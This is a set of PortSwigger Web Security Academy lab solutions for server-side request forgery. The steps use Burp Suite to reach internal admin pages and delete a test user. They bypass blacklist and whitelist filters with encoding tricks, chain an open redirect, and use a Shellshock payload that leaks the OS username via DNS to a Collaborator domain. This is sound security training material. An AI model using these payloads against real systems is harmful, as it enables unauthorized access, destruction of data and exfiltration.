########### https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

Browse to /admin and observe that you can't directly access the admin page.

Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.

Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.

Read the HTML to identify the URL to delete the target user, which is:
http://localhost/admin/delete?username=carlos

Submit this URL in the stockApi parameter, to deliver the SSRF attack.

########### https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.

Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP
address (the number 1), click "Add §".

Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To"
and "Step" boxes respectively.
    
Click "Start attack".
    
Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, 
showing an admin interface.
    
Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos

########### https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    
Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.

Bypass the block by changing the URL to: http://127.1/

Change the URL to http://127.1/admin and observe that the URL is blocked again.

Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

########### https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.

Try tampering with the stockApi parameter and observe that it isn't possible to make the server issue the request directly to a different host.

Click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection.

Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, 
and feed this into the stockApi parameter on the stock checker:
/product/nextProduct?path=http://192.168.0.12:8080/admin

Observe that the stock checker follows the redirection and shows you the admin page.

Amend the path to delete the target user:
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

########### https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.

Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace 
the original domain with a Burp Collaborator generated domain. Send the request.

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again,
since the server-side command is executed asynchronously.

You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

########### https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    
Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, 
extracting the hostname, and validating it against a whitelist.
    
Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that
the URL parser supports embedded credentials.

Append a # to the username and observe that the URL is now rejected.

Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, 
indicating that the server may have attempted to connect to "username".

To access the admin interface and delete the target user, change the URL to:
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

########### https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
    
Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
    
Browse the site.
    
Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, 
via the Referer header.
    
Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
    
Send the request to the product page to Burp Intruder.

Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
    () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
    
Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
    
Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
    
Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    
Click "Start attack".
    
When the attack is finished, go back to the Collaborator tab, and click "Poll now". 
If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. 
You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. 
The name of the OS user should appear within the DNS subdomain.
    
To complete the lab, enter the name of the OS user.
